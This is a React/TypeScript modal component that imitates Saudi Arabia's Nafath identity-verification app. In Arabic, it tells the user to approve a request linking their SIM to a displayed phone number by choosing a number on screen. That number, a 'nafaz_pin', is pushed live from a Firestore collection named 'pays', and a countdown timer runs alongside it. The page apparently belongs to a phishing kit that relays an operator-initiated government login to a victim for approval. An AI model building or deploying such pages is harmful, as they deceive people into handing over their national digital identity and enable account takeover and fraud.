"use client"

import { useState, useEffect } from "react"
import { doc, onSnapshot } from "firebase/firestore"
import { db } from "@/lib/firebase"

interface ModalProps {
  isOpen: boolean
  onClose: () => void
  userId: string // User ID to fetch the correct document
  phone: string
}

export default function NafazModal({ isOpen, onClose, userId, phone }: ModalProps) {
  const [timeLeft, setTimeLeft] = useState(60)
  const [auth_number, setAuthNumber] = useState<string>("")
  const [loading, setLoading] = useState(true)

  // Fetch Nafaz PIN from Firestore and listen for changes
  useEffect(() => {
    if (!isOpen || !userId) return
    console.log(auth_number)
    // eslint-disable-next-line no-constant-binary-expression
    setLoading(true && auth_number !== "")

    // Set up real-time listener to the user's document in Firestore
    const userDocRef = doc(db, "pays", userId)

    const unsubscribe = onSnapshot(
      userDocRef,
      (docSnapshot) => {
        if (docSnapshot.exists()) {
          const userData = docSnapshot.data()
          // Assuming the PIN is stored in a field called 'nafaz_pin'
          const pin = userData.nafaz_pin || ""
          setAuthNumber(pin)
        } else {
          console.error("User document not found")
        }
        setLoading(false)
      },
      (error) => {
        console.error("Error fetching Nafaz PIN:", error)
        setLoading(false)
      },
    )

    // Clean up the listener when component unmounts or modal closes
    return () => unsubscribe()
  }, [isOpen, userId])

  // Timer logic
  useEffect(() => {
    if (!isOpen) {
      setTimeLeft(60)
      return
    }

    const timer = setInterval(() => {
      setTimeLeft((prevTime) => {
        if (prevTime <= 1) {
          clearInterval(timer)
          return 0
        }
        return prevTime - 1
      })
    }, 1000)

    return () => clearInterval(timer)
  }, [isOpen])

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins}:${secs.toString().padStart(2, "0")}`
  }

  if (!isOpen) return null

  return (
    <div className="fixed inset-0 z-50 overflow-y-auto">
      <div className="fixed inset-0 bg-black bg-opacity-50 transition-opacity" onClick={onClose}></div>

      <div className="flex items-center justify-center min-h-screen px-4 py-8 sm:p-6">
        <div className="relative bg-white rounded-lg max-w-xl w-full mx-auto shadow-xl">
          <div className="p-4 sm:p-8 text-center space-y-6">
            <button
              onClick={onClose}
              className="absolute top-4 left-4 text-gray-400 hover:text-gray-500 transition-colors"
            >
              <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
              </svg>
            </button>

            <h3 className="text-2xl sm:text-3xl font-bold text-[#3a9f8c] text-right">التحقق من خلال تطبيق نفاذ</h3>

            <span className="bg-[#3a9f8c] flex justify-center p-4 text-white rounded-lg text-lg">تطبيق نفاذ</span>

            <div className="w-24 h-24 rounded-xl flex items-center justify-center mx-auto border-2 border-[#3a9f8c]">
              {loading ? (
                <div className="animate-pulse h-8 w-16 bg-gray-200 rounded"></div>
              ) : (
                <span className="text-4xl font-medium text-[#3a9f8c]">{auth_number}</span>
              )}
            </div>

            <div className="mt-8 leading-relaxed max-w-md mx-auto">
              <p className="text-base sm:text-lg leading-relaxed text-gray-600">
                الرجاء فتح تطبيق نفاذ وتأكيد طلب اصدار امر ربط شريحتك على رقم الجوال
                <span className="mx-2 text-[#3a9f8c] font-medium">( {phone} )</span>
                <span className="block mt-3">باختيار الرقم أعلاه</span>
                <div className="flex items-center justify-center">
                  <div className="bg-gray-100 rounded-lg px-4 py-2">
                    <span className="text-[#3a9f8c] font-semibold">{formatTime(timeLeft)}</span>
                  </div>
                </div>
              </p>
            </div>

            <div className="flex flex-row gap-8 sm:gap-12 justify-center mt-8">
              <div className="flex flex-col items-center space-y-3">
                <span className="text-[#3a9f8c] font-semibold text-lg">الخطوه 1</span>
                <img src="/nafaz_logo.webp" alt="نفاذ" className="w-24 h-24 object-contain" />
                <span className="text-[#3a9f8c] font-semibold text-center">تحميل تطبيق نفاذ</span>
              </div>

              <div className="flex flex-col items-center space-y-3">
                <span className="text-[#3a9f8c] font-semibold text-lg">الخطوه 2</span>
                <img src="/face-verification.webp" alt="التحقق من الوجه" className="w-24 h-24 object-contain" />
                <span className="text-[#3a9f8c] text-center max-w-[200px] font-semibold">
                  اختيار الرقم أعلاه والتحقق عبر السمات الحيوية
                </span>
              </div>
            </div>

            <button
              onClick={onClose}
              className="mt-8 mx-auto bg-[#3a9f8c] text-white px-8 py-3 rounded-lg hover:bg-[#3a9f8c]/80 transition-colors"
            >
              إغلاق
            </button>
          </div>
        </div>
      </div>
    </div>
  )
}

